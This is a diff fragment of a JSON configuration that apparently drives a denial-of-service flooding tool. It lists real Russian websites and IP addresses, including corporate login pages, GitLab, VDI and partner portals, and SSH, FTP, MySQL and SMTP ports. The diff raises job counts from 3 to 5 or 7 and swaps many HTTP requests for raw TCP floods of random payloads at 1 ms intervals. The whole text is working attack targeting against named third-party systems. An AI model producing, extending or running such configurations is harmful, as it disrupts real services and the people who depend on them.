+            "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4933,37 +4198,38 @@
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://4k-monitor.ru/login/"
+          "path": "http://4k-monitor.ru/login/"
         },
         "client": {
           "static_host": {
             "addr": "80.78.251.228:1500",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.svyaznoy.ru/catalog/notebook/7152"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.199.80.70:80",
             "is_tls": "false"
           }
         }
       }
     }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "91.199.80.70:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "91.199.80.70:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -4978,22 +4244,7 @@
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.svyaznoy.ru/catalog/notebook/7152"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.199.80.70:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -5008,7 +4259,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "83.143.194.180:21",
         "body": "{{ random_payload 10 }}",
@@ -5016,15 +4267,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
       "args": {
         "address": "83.143.194.180:22",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "91.199.80.140:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 5,
       "args": {
         "request": {
           "method": "GET",
@@ -5033,253 +4292,147 @@
         "client": {
           "static_host": {
             "addr": "91.199.80.140:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://extgitlab.home.svyaznoy.ru/users/sign_in"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.199.80.140:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://drive.home.svyaznoy.ru/index.php/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.199.80.44:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://drive.home.svyaznoy.ru/index.php/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.199.80.44:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://vdi.svyaznoy.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "83.143.194.220:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://vdi.svyaznoy.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "83.143.194.220:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://vdi.svyaznoy.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "83.143.194.220:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://vdi.svyaznoy.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "83.143.194.220:8443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://broker.svyaznoy.ru/partner_v2/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.199.80.64:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://broker.svyaznoy.ru/partner_v2/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.199.80.64:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://adminacademy.svyaznoy.ru/#/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.199.80.70:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://adminacademy.svyaznoy.ru/#/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.199.80.70:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://adminacademy.svyaznoy.ru/#/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.199.80.70:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://adminacademy.svyaznoy.ru/#/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.199.80.42:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://adminacademy.svyaznoy.ru/#/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.199.80.42:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://svyaznoy.e-queo.online/0/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.206.166.18:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://svyaznoy.e-queo.online/0/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.206.166.18:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 5,
+      "args": {
+        "address": "91.199.80.44:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "91.199.80.44:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "83.143.194.220:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "83.143.194.220:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 5,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://vdi.svyaznoy.ru/"
+        },
+        "client": {
+          "static_host": {
+            "addr": "83.143.194.220:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 5,
+      "args": {
+        "address": "83.143.194.220:8443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "91.199.80.64:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "91.199.80.64:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "91.199.80.70:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "91.199.80.70:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "http",
+      "count": 7,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://adminacademy.svyaznoy.ru/#/login"
+        },
+        "client": {
+          "static_host": {
+            "addr": "91.199.80.70:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "91.199.80.42:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "91.199.80.42:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "185.206.166.18:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "185.206.166.18:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
       "args": {
         "address": "87.236.16.28:21",
         "body": "{{ random_payload 10 }}",
@@ -5287,15 +4440,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "87.236.16.28:22",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "87.236.16.28:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5309,46 +4470,32 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://akom.su/catalog/starter/akkumulyatory-akom-efb.html"
-        },
-        "client": {
-          "static_host": {
-            "addr": "87.236.16.28:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://akom.su/catalog/starter/akkumulyatory-akom-efb.html"
-        },
-        "client": {
-          "static_host": {
-            "addr": "87.236.16.28:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "87.236.16.28:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "87.236.16.28:3306",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "37.230.154.135:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5362,23 +4509,8 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.aktex.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "37.230.154.135:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "193.107.236.160:21",
         "body": "{{ random_payload 10 }}",
@@ -5386,7 +4518,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "193.107.236.160:22",
         "body": "{{ random_payload 10 }}",
@@ -5394,15 +4526,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "193.107.236.160:25",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "193.107.236.160:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5416,38 +4556,16 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://akbmag.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "193.107.236.160:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "193.107.236.160:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://akbmag.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "193.107.236.160:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5462,45 +4580,31 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "93.188.42.45:22",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.kupit-akkumulyator.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "93.188.42.45:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.kupit-akkumulyator.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "93.188.42.45:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "93.188.42.45:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
+      "args": {
+        "address": "93.188.42.45:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
       "args": {
         "address": "93.188.42.45:3306",
         "body": "{{ random_payload 10 }}",
@@ -5508,7 +4612,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "93.188.42.45:8893",
         "body": "{{ random_payload 10 }}",
@@ -5516,7 +4620,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "93.188.42.45:9306",
         "body": "{{ random_payload 10 }}",
@@ -5524,7 +4628,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "93.188.42.45:9312",
         "body": "{{ random_payload 10 }}",
@@ -5532,15 +4636,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "188.225.46.82:22",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "188.225.46.82:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5554,38 +4666,16 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://akbauto.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "188.225.46.82:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "188.225.46.82:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://akbauto.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "188.225.46.82:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5599,8 +4689,16 @@
         }
       }
     }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "91.206.15.10:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5614,38 +4712,16 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://akb.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.206.15.10:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "91.206.15.10:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://akb.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "91.206.15.10:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5659,38 +4735,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.kolesa-darom.ru/catalog/avto/akkumulyatory/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.235.204:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "178.248.235.204:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "178.248.235.204:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.kolesa-darom.ru/catalog/avto/akkumulyatory/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.248.235.204:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5705,30 +4767,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "5.188.156.174:22",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://opt.kolesa-darom.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "5.188.156.174:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "5.188.156.174:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5743,7 +4798,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "188.246.230.242:21",
         "body": "{{ random_payload 10 }}",
@@ -5751,60 +4806,47 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "188.246.230.242:22",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://ftp.kolesa-darom.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "188.246.230.242:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "188.246.230.242:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "188.246.230.242:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "185.154.54.7:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "185.154.54.7:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ftp.kolesa-darom.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "188.246.230.242:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://akb-moscow.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.154.54.7:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5818,38 +4860,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://akb-moscow.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.154.54.7:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "78.155.198.69:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "78.155.198.69:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.autorus.ru/catalog/akkumulyatory-legkovyye"
-        },
-        "client": {
-          "static_host": {
-            "addr": "78.155.198.69:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5863,23 +4891,16 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.autorus.ru/catalog/akkumulyatory-legkovyye"
-        },
-        "client": {
-          "static_host": {
-            "addr": "78.155.198.69:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "82.202.197.38:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5893,38 +4914,16 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://tyumenbattery.ru/product/azia/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "82.202.197.38:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "82.202.197.38:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://tyumenbattery.ru/product/azia/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "82.202.197.38:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5938,8 +4937,16 @@
         }
       }
     }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "37.140.192.91:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5953,38 +4960,16 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://alkor-tmn.ru/battery/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "37.140.192.91:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "37.140.192.91:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://alkor-tmn.ru/battery/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "37.140.192.91:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -5998,8 +4983,16 @@
         }
       }
     }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "82.146.51.254:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -6013,38 +5006,16 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://elrsar.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "82.146.51.254:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "82.146.51.254:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://elrsar.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "82.146.51.254:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -6058,38 +5029,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://gk-kaz.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "212.41.9.219:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "212.41.9.219:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "212.41.9.219:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://gk-kaz.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "212.41.9.219:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -6103,38 +5060,24 @@
         }
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.aktorstc.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "37.18.77.196:80",
-            "is_tls": "false"
-          }
-        }
+        "address": "37.18.77.196:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "37.18.77.196:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.aktorstc.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "37.18.77.196:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -6149,7 +5092,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "37.18.77.196:1723",
         "body": "{{ random_payload 10 }}",
@@ -6157,45 +5100,31 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "185.41.186.236:21",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
-      "type": "http",
-      "count": 3,
+      "type": "tcp",
+      "count": 7,
       "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://ooo-extruzia.ru/order"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.41.186.236:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 3,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ooo-extruzia.ru/order"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.41.186.236:443",
-            "is_tls": "true"
-          }
-        }
+        "address": "185.41.186.236:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
+      "args": {
+        "address": "185.41.186.236:443",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
+      "type": "tcp",
+      "count": 7,
       "args": {
         "address": "185.41.186.236:3306",
         "body": "{{ random_payload 10 }}",
@@ -6203,15 +5132,23 @@
       }
     }, {
       "type": "tcp",
-      "count": 3,
+      "count": 7,
       "args": {
         "address": "185.41.186.236:3307",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
+      "type": "tcp",
+      "count": 7,
+      "args": {
+        "address": "90.156.201.35:80",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    }, {
       "type": "http",
-      "count": 3,
+      "count": 7,
       "args": {
         "request": {
           "method": "GET",
@@ -6225,23 +5162,16 @@
         }
       }
     }, {
-      "type": "http",
